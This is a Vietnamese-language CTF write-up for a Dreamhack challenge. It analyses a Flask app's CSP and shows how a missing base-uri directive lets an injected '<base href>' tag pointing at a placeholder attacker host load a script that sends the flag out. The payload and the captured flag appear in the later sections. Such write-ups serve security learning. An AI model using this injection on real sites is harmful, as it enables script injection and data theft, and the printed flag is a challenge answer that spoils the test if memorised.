**CSP Bypass**
---
<img width="613" height="677" alt="image" src="https://github.com/user-attachments/assets/1f6f8182-3c0b-48d1-8342-612332affbcf" />

Truy cập vào wed có giao diện như sau

<img width="384" height="280" alt="image" src="https://github.com/user-attachments/assets/a28154e3-86bd-486c-9a87-6a28dafbc1af" />

<img width="644" height="259" alt="image" src="https://github.com/user-attachments/assets/8bbaed3d-c2c1-4871-892b-b86bf4338f15" />



**I. Phân Tích Mã Nguồn và Chính Sách Bảo Mật**

Bài thử thách này dựa trên một ứng dụng Flask đơn giản mô phỏng quá trình kiểm tra XSS bằng Bot (sử dụng Selenium).

**1.1. Chính Sách CSP**

Hàm add_header thiết lập chính sách bảo mật CSP cho mọi phản hồi:

```bash
response.headers["Content-Security-Policy"] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'"
```
- script-src 'self': Chỉ cho phép tải script từ chính nguồn gốc (domain).

- script-src ... 'nonce-{nonce}': Bắt buộc mọi script nội tuyến phải có giá trị nonce ngẫu nhiên, ngăn chặn XSS qua chèn <script>...</script> thông thường.

**1.2. Điểm Yếu: Thiếu Chỉ Thị base-uri**

Mã nguồn tại endpoint /vuln là nơi xảy ra lỗi XSS:

```bash

@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param
```

- Hàm này trực tiếp trả về giá trị của tham số param mà không có bất kỳ bộ lọc (sanitization) nào.

- Khi Bot truy cập trang này, payload XSS của chúng ta (param) được chèn vào HTML. Mặc dù CSP đã bảo vệ khỏi các script bên ngoài, nó hoàn toàn không chứa chỉ thị base-uri.

===> Đây là lỗ hổng then chốt.

----
**II.Đánh cắp FLAG**

**1. Thiết Lập Máy Chủ Attacker**

- Đặt file jquery.min.js với nội dung ở mục 2.2 vào thư mục gốc của máy chủ công cộng do bạn kiểm soát ([YOUR_ATTACKER_IP_OR_DOMAIN]).

**2. Chèn Payload Injection**

- Địa chỉ Submit: http://host8.dreamhack.games:14117/flag

Payload được nhập vào trường param:
```bash
"><base href="http://[YOUR_ATTACKER_IP_OR_DOMAIN]/" />
```

**3. Thu Thập Flag**

- Sau khi Submit, Bot sẽ truy cập URL độc hại.

- Quá trình Base URI Bypass xảy ra, Bot tải và thực thi jquery.min.js từ máy chủ Attacker.

- Script chạy và gửi Flag về trang /memo.

- Attacker truy cập trang /memo để đọc nội dung được lưu:

    + URL: http://host8.dreamhack.games:14117/memo

**III.Kết quả**

- Flag đã được thu thập thành công thông qua kỹ thuật Base URI Bypass:

Flag: DH{81e64da19119756d725a33889ec3909c}
